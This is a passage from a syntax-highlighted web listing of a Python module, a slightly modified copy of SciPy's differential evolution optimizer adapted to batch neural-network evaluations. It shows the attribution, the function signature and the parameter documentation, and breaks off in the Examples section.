class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy._lib._util <span class="keyword">import</span> check_random_state</span><br><span class="line"><span class="keyword">from</span> scipy.optimize._optimize <span class="keyword">import</span> _status_message</span><br><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> OptimizeResult, minimize</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">A slight modification to Scipy&#x27;s implementation of differential evolution. To speed up predictions, the entire parameters array is passed to `self.func`, where a neural network model can batch its computations and execute in parallel. Search for `CHANGES` to find all code changes.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Dan Kondratyuk 2018</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Original code adapted from</span></span><br><span class="line"><span class="string">https://github.com/scipy/scipy/blob/70e61dee181de23fdd8d893eaa9491100e2218d7/scipy/optimize/_differentialevolution.py</span></span><br><span class="line"><span class="string">----------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">differential_evolution: The differential evolution global optimization algorithm</span></span><br><span class="line"><span class="string">Added by Andrew Nelson 2014</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_MACHEPS = np.finfo(np.float64).eps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">differential_evolution</span>(<span class="params">func, bounds, args=(<span class="params"></span>), strategy=<span class="string">&#x27;best1bin&#x27;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           maxiter=<span class="number">1000</span>, popsize=<span class="number">15</span>, tol=<span class="number">0.01</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           mutation=(<span class="params"><span class="number">0.5</span>, <span class="number">1</span></span>), recombination=<span class="number">0.7</span>, seed=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           callback=<span class="literal">None</span>, disp=<span class="literal">False</span>, polish=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           init=<span class="string">&#x27;latinhypercube&#x27;</span>, atol=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Finds the global minimum of a multivariate function.</span></span><br><span class="line"><span class="string">    Differential Evolution is stochastic in nature (does not use gradient</span></span><br><span class="line"><span class="string">    methods) to find the minimium, and can search large areas of candidate</span></span><br><span class="line"><span class="string">    space, but often requires larger numbers of function evaluations than</span></span><br><span class="line"><span class="string">    conventional gradient based techniques.</span></span><br><span class="line"><span class="string">    The algorithm is due to Storn and Price [1]_.</span></span><br><span class="line"><span class="string">    Parameters</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    func : callable</span></span><br><span class="line"><span class="string">        The objective function to be minimized.  Must be in the form</span></span><br><span class="line"><span class="string">        ``f(x, *args)``, where ``x`` is the argument in the form of a 1-D array</span></span><br><span class="line"><span class="string">        and ``args`` is a  tuple of any additional fixed parameters needed to</span></span><br><span class="line"><span class="string">        completely specify the function.</span></span><br><span class="line"><span class="string">    bounds : sequence</span></span><br><span class="line"><span class="string">        Bounds for variables.  ``(min, max)`` pairs for each element in ``x``,</span></span><br><span class="line"><span class="string">        defining the lower and upper bounds for the optimizing argument of</span></span><br><span class="line"><span class="string">        `func`. It is required to have ``len(bounds) == len(x)``.</span></span><br><span class="line"><span class="string">        ``len(bounds)`` is used to determine the number of parameters in ``x``.</span></span><br><span class="line"><span class="string">    args : tuple, optional</span></span><br><span class="line"><span class="string">        Any additional fixed parameters needed to</span></span><br><span class="line"><span class="string">        completely specify the objective function.</span></span><br><span class="line"><span class="string">    strategy : str, optional</span></span><br><span class="line"><span class="string">        The differential evolution strategy to use. Should be one of:</span></span><br><span class="line"><span class="string">            - &#x27;best1bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;best1exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;rand1exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;randtobest1exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;currenttobest1exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;best2exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;rand2exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;randtobest1bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;currenttobest1bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;best2bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;rand2bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;rand1bin&#x27;</span></span><br><span class="line"><span class="string">        The default is &#x27;best1bin&#x27;.</span></span><br><span class="line"><span class="string">    maxiter : int, optional</span></span><br><span class="line"><span class="string">        The maximum number of generations over which the entire population is</span></span><br><span class="line"><span class="string">        evolved. The maximum number of function evaluations (with no polishing)</span></span><br><span class="line"><span class="string">        is: ``(maxiter + 1) * popsize * len(x)``</span></span><br><span class="line"><span class="string">    popsize : int, optional</span></span><br><span class="line"><span class="string">        A multiplier for setting the total population size.  The population has</span></span><br><span class="line"><span class="string">        ``popsize * len(x)`` individuals (unless the initial population is</span></span><br><span class="line"><span class="string">        supplied via the `init` keyword).</span></span><br><span class="line"><span class="string">    tol : float, optional</span></span><br><span class="line"><span class="string">        Relative tolerance for convergence, the solving stops when</span></span><br><span class="line"><span class="string">        ``np.std(pop) &lt;= atol + tol * np.abs(np.mean(population_energies))``,</span></span><br><span class="line"><span class="string">        where and `atol` and `tol` are the absolute and relative tolerance</span></span><br><span class="line"><span class="string">        respectively.</span></span><br><span class="line"><span class="string">    mutation : float or tuple(float, float), optional</span></span><br><span class="line"><span class="string">        The mutation constant. In the literature this is also known as</span></span><br><span class="line"><span class="string">        differential weight, being denoted by F.</span></span><br><span class="line"><span class="string">        If specified as a float it should be in the range [0, 2].</span></span><br><span class="line"><span class="string">        If specified as a tuple ``(min, max)`` dithering is employed. Dithering</span></span><br><span class="line"><span class="string">        randomly changes the mutation constant on a generation by generation</span></span><br><span class="line"><span class="string">        basis. The mutation constant for that generation is taken from</span></span><br><span class="line"><span class="string">        ``U[min, max)``. Dithering can help speed convergence significantly.</span></span><br><span class="line"><span class="string">        Increasing the mutation constant increases the search radius, but will</span></span><br><span class="line"><span class="string">        slow down convergence.</span></span><br><span class="line"><span class="string">    recombination : float, optional</span></span><br><span class="line"><span class="string">        The recombination constant, should be in the range [0, 1]. In the</span></span><br><span class="line"><span class="string">        literature this is also known as the crossover probability, being</span></span><br><span class="line"><span class="string">        denoted by CR. Increasing this value allows a larger number of mutants</span></span><br><span class="line"><span class="string">        to progress into the next generation, but at the risk of population</span></span><br><span class="line"><span class="string">        stability.</span></span><br><span class="line"><span class="string">    seed : int or `np.random.RandomState`, optional</span></span><br><span class="line"><span class="string">        If `seed` is not specified the `np.RandomState` singleton is used.</span></span><br><span class="line"><span class="string">        If `seed` is an int, a new `np.random.RandomState` instance is used,</span></span><br><span class="line"><span class="string">        seeded with seed.</span></span><br><span class="line"><span class="string">        If `seed` is already a `np.random.RandomState instance`, then that</span></span><br><span class="line"><span class="string">        `np.random.RandomState` instance is used.</span></span><br><span class="line"><span class="string">        Specify `seed` for repeatable minimizations.</span></span><br><span class="line"><span class="string">    disp : bool, optional</span></span><br><span class="line"><span class="string">        Display status messages</span></span><br><span class="line"><span class="string">    callback : callable, `callback(xk, convergence=val)`, optional</span></span><br><span class="line"><span class="string">        A function to follow the progress of the minimization. ``xk`` is</span></span><br><span class="line"><span class="string">        the current value of ``x0``. ``val`` represents the fractional</span></span><br><span class="line"><span class="string">        value of the population convergence.  When ``val`` is greater than one</span></span><br><span class="line"><span class="string">        the function halts. If callback returns `True`, then the minimization</span></span><br><span class="line"><span class="string">        is halted (any polishing is still carried out).</span></span><br><span class="line"><span class="string">    polish : bool, optional</span></span><br><span class="line"><span class="string">        If True (default), then `scipy.optimize.minimize` with the `L-BFGS-B`</span></span><br><span class="line"><span class="string">        method is used to polish the best population member at the end, which</span></span><br><span class="line"><span class="string">        can improve the minimization slightly.</span></span><br><span class="line"><span class="string">    init : str or array-like, optional</span></span><br><span class="line"><span class="string">        Specify which type of population initialization is performed. Should be</span></span><br><span class="line"><span class="string">        one of:</span></span><br><span class="line"><span class="string">            - &#x27;latinhypercube&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;random&#x27;</span></span><br><span class="line"><span class="string">            - array specifying the initial population. The array should have</span></span><br><span class="line"><span class="string">              shape ``(M, len(x))``, where len(x) is the number of parameters.</span></span><br><span class="line"><span class="string">              `init` is clipped to `bounds` before use.</span></span><br><span class="line"><span class="string">        The default is &#x27;latinhypercube&#x27;. Latin Hypercube sampling tries to</span></span><br><span class="line"><span class="string">        maximize coverage of the available parameter space. &#x27;random&#x27;</span></span><br><span class="line"><span class="string">        initializes the population randomly - this has the drawback that</span></span><br><span class="line"><span class="string">        clustering can occur, preventing the whole of parameter space being</span></span><br><span class="line"><span class="string">        covered. Use of an array to specify a population subset could be used,</span></span><br><span class="line"><span class="string">        for example, to create a tight bunch of initial guesses in an location</span></span><br><span class="line"><span class="string">        where the solution is known to exist, thereby reducing time for</span></span><br><span class="line"><span class="string">        convergence.</span></span><br><span class="line"><span class="string">    atol : float, optional</span></span><br><span class="line"><span class="string">        Absolute tolerance for convergence, the solving stops when</span></span><br><span class="line"><span class="string">        ``np.std(pop) &lt;= atol + tol * np.abs(np.mean(population_energies))``,</span></span><br><span class="line"><span class="string">        where and `atol` and `tol` are the absolute and relative tolerance</span></span><br><span class="line"><span class="string">        respectively.</span></span><br><span class="line"><span class="string">    Returns</span></span><br><span class="line"><span class="string">    -------</span></span><br><span class="line"><span class="string">    res : OptimizeResult</span></span><br><span class="line"><span class="string">        The optimization result represented as a `OptimizeResult` object.</span></span><br><span class="line"><span class="string">        Important attributes are: ``x`` the solution array, ``success`` a</span></span><br><span class="line"><span class="string">        Boolean flag indicating if the optimizer exited successfully and</span></span><br><span class="line"><span class="string">        ``message`` which describes the cause of the termination. See</span></span><br><span class="line"><span class="string">        `OptimizeResult` for a description of other attributes.  If `polish`</span></span><br><span class="line"><span class="string">        was employed, and a lower minimum was obtained by the polishing, then</span></span><br><span class="line"><span class="string">        OptimizeResult also contains the ``jac`` attribute.</span></span><br><span class="line"><span class="string">    Notes</span></span><br><span class="line"><span class="string">    -----</span></span><br><span class="line"><span class="string">    Differential evolution is a stochastic population based method that is</span></span><br><span class="line"><span class="string">    useful for global optimization problems. At each pass through the population</span></span><br><span class="line"><span class="string">    the algorithm mutates each candidate solution by mixing with other candidate</span></span><br><span class="line"><span class="string">    solutions to create a trial candidate. There are several strategies [2]_ for</span></span><br><span class="line"><span class="string">    creating trial candidates, which suit some problems more than others. The</span></span><br><span class="line"><span class="string">    &#x27;best1bin&#x27; strategy is a good starting point for many systems. In this</span></span><br><span class="line"><span class="string">    strategy two members of the population are randomly chosen. Their difference</span></span><br><span class="line"><span class="string">    is used to mutate the best member (the `best` in `best1bin`), :math:`b_0`,</span></span><br><span class="line"><span class="string">    so far:</span></span><br><span class="line"><span class="string">    .. math::</span></span><br><span class="line"><span class="string">        b&#x27; = b_0 + mutation * (population[rand0] - population[rand1])</span></span><br><span class="line"><span class="string">    A trial vector is then constructed. Starting with a randomly chosen &#x27;i&#x27;th</span></span><br><span class="line"><span class="string">    parameter the trial is sequentially filled (in modulo) with parameters from</span></span><br><span class="line"><span class="string">    `b&#x27;` or the original candidate. The choice of whether to use `b&#x27;` or the</span></span><br><span class="line"><span class="string">    original candidate is made with a binomial distribution (the &#x27;bin&#x27; in</span></span><br><span class="line"><span class="string">    &#x27;best1bin&#x27;) - a random number in [0, 1) is generated.  If this number is</span></span><br><span class="line"><span class="string">    less than the `recombination` constant then the parameter is loaded from</span></span><br><span class="line"><span class="string">    `b&#x27;`, otherwise it is loaded from the original candidate.  The final</span></span><br><span class="line"><span class="string">    parameter is always loaded from `b&#x27;`.  Once the trial candidate is built</span></span><br><span class="line"><span class="string">    its fitness is assessed. If the trial is better than the original candidate</span></span><br><span class="line"><span class="string">    then it takes its place. If it is also better than the best overall</span></span><br><span class="line"><span class="string">    candidate it also replaces that.</span></span><br><span class="line"><span class="string">    To improve your chances of finding a global minimum use higher `popsize`</span></span><br><span class="line"><span class="string">    values, with higher `mutation` and (dithering), but lower `recombination`</span></span><br><span class="line"><span class="string">    values. This has the effect of widening the search radius, but slowing</span></span><br><span class="line"><span class="string">    convergence.</span></span><br><span class="line"><span class="string">    .. versionadded:: 0.15.0</span></span><br><span class="line"><span class="string">    Examples</span></span><br><span class="line"><span class="string">    --------</span></span><br><span class="line"><span class="string">    Let us consider the problem of minimizing the 